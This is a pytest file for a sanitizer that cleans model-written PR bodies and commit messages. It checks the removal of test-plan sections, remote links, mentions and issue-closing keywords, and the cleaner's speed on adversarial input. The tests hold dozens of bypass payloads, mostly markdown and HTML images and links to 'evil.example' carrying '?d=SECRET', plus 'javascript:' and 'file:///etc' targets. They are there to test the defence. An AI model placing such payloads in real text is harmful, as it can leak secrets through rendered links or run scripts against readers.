"""W7 text-job-bind: what the cleaning of model text does and does not touch (S4, F5).

Pure functions; the integration with the engine (rows, files, the commit that results) is in ``test_w7_engine.py``.
"""

from __future__ import annotations

import pytest

from llm_router.text_job_bind import sanitize

PH = sanitize.TEST_PLAN_PLACEHOLDER


@pytest.mark.parametrize("text", [
    "## Test plan\nRan pytest.\n",
    "### Testing\nRan npm test, 412 passed.\n",
    "## Tests\n- test_a passes\n",
    "## Test results\nall green\n",
    "## :white_check_mark: Verification\n- all green\n",
    "## ✅ Testing\nok\n",
    "   ### How to test\nrun it\n",
    "## Manual testing\nclicked around\n",
    "## QA\nchecked\n",
    "**Test plan**\nran it\n",
    "Test plan\nran it\n",
    "Testing:\nran it\n",
])
def test_every_kind_of_test_or_verification_section_is_replaced(text):
    out = sanitize.clean(text, pr_body=True)
    assert out.test_plan == 1 and PH in out.text
    for claim in ("pytest", "412", "green", "clicked", "checked", "ran it", "run it", "passes"):
        assert claim not in out.text


def test_the_inline_form_replaces_the_rest_of_its_paragraph_only():
    out = sanitize.clean("Test plan: ran pytest\nand then more\n\nNext paragraph stays.", pr_body=True)
    assert out.test_plan == 1 and "pytest" not in out.text and "more" not in out.text
    assert out.text.endswith("Next paragraph stays.")


@pytest.mark.parametrize("text", [
    "Testing the change was easy.", "## Summary\nThe tests were hard to write.", "## Contested\nx", "## Notes\nsee tests/test_a.py",
    "## Testimonials\nx", "The verification step is documented in docs/x.md",
])
def test_prose_and_other_headings_are_left_alone(text):
    assert sanitize.clean(text, pr_body=True).test_plan == 0
    assert sanitize.clean(text, pr_body=True).text == text


def test_a_commit_message_is_not_given_a_test_plan_treatment():
    out = sanitize.clean("fix: a\n\n## Testing\nran it", pr_body=False)
    assert out.test_plan == 0 and "ran it" in out.text


def test_a_section_runs_to_the_next_heading_and_the_rest_is_kept():
    out = sanitize.clean("## Summary\nS\n\n### Testing\nran it\nmore\n\n## Notes\nN", pr_body=True)
    assert out.text == f"## Summary\nS\n\n### Testing\n\n{PH}\n\n## Notes\nN"


def test_remote_images_and_links_are_removed_and_their_text_kept():
    text = ("See [the docs](https://evil.example/x?d=secret) and [local](docs/a.md), [anchor](#top), "
            "![chart](https://img.example/c.png?q=1) and ![inline](./local.png) and ![d](data:image/png;base64,AAAA) "
            '<img src="https://x.example/p.png"> <a href="http://x.example">here</a> ![p](//cdn.example/p.png).\n'
            "[ref]: https://x.example/ref\nend")
    out = sanitize.clean(text, pr_body=True)
    for host in ("evil.example", "img.example", "x.example", "cdn.example", "data:image", "base64"):
        assert host not in out.text, host
    assert "the docs" in out.text and "chart" in out.text and "here" in out.text
    assert "[local](docs/a.md)" in out.text and "[anchor](#top)" in out.text and "![" not in out.text  # image syntax is gone
    assert "[inline](./local.png)" in out.text  # a relative target stays, as a plain link
    assert out.urls >= 7 and out.text.endswith("end")


@pytest.mark.parametrize("text", [
    "![a [b] c](https://evil.example/x.png?d=SECRET)",                    # nested brackets in the alt text
    "[a [b] c](https://evil.example/x?d=SECRET)",                         # nested brackets in the link text
    "[r]:\nhttps://evil.example/ref?d=SECRET",                            # the definition's destination on the next line
    "> [r]: https://evil.example/ref?d=SECRET",                           # a definition inside a block quote
    "- [r]: https://evil.example/ref?d=SECRET",                           # and inside a list
    "[a\\]b]: https://evil.example/ref?d=SECRET",                        # an escaped bracket in the label
    "&#104;ttps://evil.example/x?d=SECRET", "https&#58;//evil.example/x?d=SECRET", "https&colon;//evil.example/x?d=SECRET",
    "&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;evil.example/x?d=SECRET",
    "![x](\\/\\/evil.example/x.png?d=SECRET)",                           # escaped protocol-relative slashes
    "[x](//evil.example/x?d=SECRET)", '<a href="//evil.example/x?d=SECRET">click', '<a href=https://evil.example/x?d=SECRET>click',
    '<picture><source srcset="https://evil.example/x.png?d=SECRET"></picture>', "<https://evil.example/x?d=SECRET>",
    "[x](JaVaScRiPt:alert(1))", "[x](javascript:alert('SECRET'))", "![x](data:image/svg+xml;base64,SECRET)", "ftp://evil.example/SECRET",
    "ssh://git@evil.example/SECRET.git", "file:///etc/SECRET", "wss://evil.example/SECRET", "git://evil.example/SECRET",
    "https://evil.example/" + "a" * 5000 + "?d=SECRET", "see:https://evil.example/SECRET",
    "htt<img src=y>ps://evil.example/SECRET", "ht<a href=z>tp</a>s://evil.example/SECRET",  # removal must not splice a new URL together
    # round 5, S5: a tag too long for the tag pattern, or with a `<` inside it, used to survive whole
    '<img src="https://evil.example/x.png?d=SECRET" alt="' + "x" * 600 + '">', '<img src=" //evil.example/x.png?d=SECRET" alt="' + "x" * 600 + '">',
    '<img src=\\\\evil.example/x.png?d=SECRET alt="' + "x" * 600 + '">', "<img src=\\\\evil.example/x.png?d=SECRET <b>",
    '<img src="//evil.example/x.png?d=SECRET" <b>', '<IMG SRC="https://evil.example/x?d=SECRET" ' + "y" * 700,
    '<iframe src="//evil.example/SECRET" ' + "y" * 700, '<picture><source srcset="//evil.example/SECRET" ' + "y" * 700,
    '<img src=" //evil.example/SECRET">', '<img src="\t\n //evil.example/SECRET">', '<video src="//evil.example/SECRET" ' + "y" * 700,
    # a target that starts with whitespace or backslashes, in markdown and bare
    "[x]( //evil.example/SECRET)", "[x](\\\\evil.example/SECRET)", "![x](  \\\\evil.example/SECRET)",
    # more schemes, and the bare ``www.`` link GitHub makes
    "gopher://evil.example/SECRET", "irc://evil.example/SECRET", "ircs://evil.example/SECRET", "smb://evil.example/SECRET",
    "ldap://evil.example/SECRET", "chrome://evil.example/SECRET", "vscode://evil.example/SECRET", "vscode-insiders://evil.example/SECRET",
    "blob:https://evil.example/SECRET", "www.evil.example/x?d=SECRET", "see www.evil.example/SECRET.",
])
def test_every_bypass_the_review_found_leaves_no_destination(text):
    out = sanitize.clean(text, pr_body=True).text
    for needle in ("evil.example", "SECRET", "javascript:", "data:image", "file:///"):
        assert needle.lower() not in out.lower(), (needle, out)


@pytest.mark.parametrize("text", ["Vec<String> and Option<T>", "a < b and c > d", "data: prose and git: rebase", "see src//dir//file",
                                  "&lt;b&gt; &amp; &quot;quoted&quot;", "[note](docs/a.md#top)", "mail me@example.com", "the // comment"])
def test_ordinary_text_with_brackets_colons_slashes_and_entities_is_untouched(text):
    assert sanitize.clean(text, pr_body=True).text == text


@pytest.mark.parametrize("text", ["@victim", "@@victim", "@@@victim", "hello @@org/team", "(@@victim)", "x\n@@victim"])
def test_a_mention_is_neutralised_however_many_at_signs_lead_it(text):
    out = sanitize.clean(text, pr_body=True)
    assert out.mentions == 1 and "@" not in out.text, out


@pytest.mark.parametrize("text", ["a@@b.com", "me@example.com", "user@@host", "@ alone", "a @", "@@", "x@"])
def test_at_signs_that_are_not_a_mention_stay(text):
    assert sanitize.clean(text, pr_body=True).text == text


@pytest.mark.parametrize("text", ["Fixes\u00a0#12", "Closes:\u00a0\u00a0#7", "Resolves\u00a0owner/repo#9", "fixed\u00a0:\u00a0#1"])
def test_a_non_breaking_space_does_not_hide_a_closing_keyword(text):
    out = sanitize.clean(text, pr_body=False)
    assert out.closing == 1 and out.text.lower().startswith("refs"), out
    assert not any(w in out.text.lower() for w in ("fix", "close", "resolve"))


def test_a_bare_url_in_prose_is_removed_too():
    """Any URL goes, marked up or not: the reader of a commit message or a PR body is better served by the words around it."""
    assert sanitize.clean("see https://example.com/page for more", pr_body=True).text == "see  for more"


@pytest.mark.parametrize("text,expected", [
    ("Fixes\n#12", "refs\n#12"), ("Closes   \n  #7", "refs   \n  #7"), ("Resolves\nowner/repo#9", "refs\nowner/repo#9"),
    ("Fixes\r\n#12", "refs\r\n#12"), ("Fixes\n\n#12", "refs\n\n#12"), ("Fixes        #12", "refs        #12"),
    ("Fixes" + " " * 16 + "#12", "refs" + " " * 16 + "#12"), ("Fixes" + " " * 17 + "#12", "Fixes" + " " * 17 + "#12"),  # the bound
])
def test_the_closing_keyword_is_neutralised_across_newlines_and_a_long_separator(text, expected):
    assert sanitize.clean(text, pr_body=False).text == expected


@pytest.mark.timing
@pytest.mark.parametrize("name,unit", [
    ("open brackets", "["), ("image markers", "!["), ("open tags", "<a "), ("references", "&#"), ("scheme words", "http"),
    ("schemes", "http://"), ("protocol-relative", "(//"), ("link middles", "]("), ("whole tags", "<a href=x>"),
    ("encoded schemes", "&#104;"), ("escapes", "\\/"), ("closing keyword", "Fixes   \n"), ("mentions", "@a/"), ("at signs", "@"),
    ("headings", "## Testing\n"), ("colons", ":a:"), ("exclamations", "!"), ("tabs and spaces", " \t"),
    # round 5: one long tag name, tags that never close, whitespace and backslashes before a target, runs of at signs
    ("one long tag name", "<" + "a" * 999_999), ("long tag names", "<" + "a" * 600), ("tag names at the limit", "<" + "a" * 31 + " "),
    ("unclosed img", "<img src=\"//x" + "a" * 600), ("img with inner tags", "<img <b <i "), ("quote and spaces", "\"" + " " * 100),
    ("whitespace before target", "( \t\n"), ("backslash targets", "=\\\\"), ("many at signs", "@" * 100 + "a "), ("www", "www."),
    ("closing keyword nbsp", "Fixes\u00a0\u00a0\n"),
])
def test_one_megabyte_of_adversarial_text_is_cleaned_in_well_under_a_second(name, unit):
    """R3/R4: the first version took 7 to 25 seconds on 64,000 open brackets. Every pattern is linear now and the input is cut at
    ``MAX_CHARS`` before any of it runs; the bound here is generous for a loaded CI machine (the assertion is under 1 s)."""
    import time

    text = unit * (1_000_000 // len(unit))
    t0 = time.perf_counter()
    out = sanitize.clean(text, pr_body=True)
    assert time.perf_counter() - t0 < 1.0, name
    assert out.truncated and len(out.text) <= sanitize.MAX_CHARS
    # and each stage alone, at the size the engine lets through
    for stage in (sanitize.strip_remote, sanitize.strip_mentions, sanitize.strip_closing, sanitize.replace_test_plan):
        t0 = time.perf_counter()
        stage(text[:sanitize.MAX_CHARS])
        assert time.perf_counter() - t0 < 1.0, (name, stage.__name__)
    for stage in (sanitize.strip_remote, sanitize.strip_mentions, sanitize.strip_closing):  # the C-speed stages on all 1 MB
        t0 = time.perf_counter()
        stage(text)
        assert time.perf_counter() - t0 < 1.0, (name, stage.__name__, "1 MB")


def test_long_runs_of_spaces_do_not_make_the_closing_keyword_pattern_quadratic():
    out = sanitize.clean("Fixes" + " " * 60_000 + "#1", pr_body=True)
    assert out.closing == 0 and out.text.endswith("#1")
    assert sanitize.clean("Fixes   #1", pr_body=False).text == "refs   #1"


def test_a_text_past_the_cap_is_cut_and_says_so():
    out = sanitize.clean("a" * (sanitize.MAX_CHARS + 10), pr_body=False)
    assert out.truncated and len(out.text) == sanitize.MAX_CHARS
    assert not sanitize.clean("a" * sanitize.MAX_CHARS, pr_body=False).truncated


@pytest.mark.parametrize("text", [
    "## Unit tests\nran npm test: 412 passed", "## Local testing\nok", "## Automated tests\nok", "## Manual verification\nok",
    "## How I tested\nok", "## What was tested\nok", "## Regression tests\nok", "## Checks run\nok", "## Results\nok",
    "__Verification__\nok", "## Test coverage\nok",
])
def test_the_wider_family_of_test_and_verification_headings_is_replaced(text):
    out = sanitize.clean(text, pr_body=True)
    assert out.test_plan == 1 and PH in out.text and "412" not in out.text
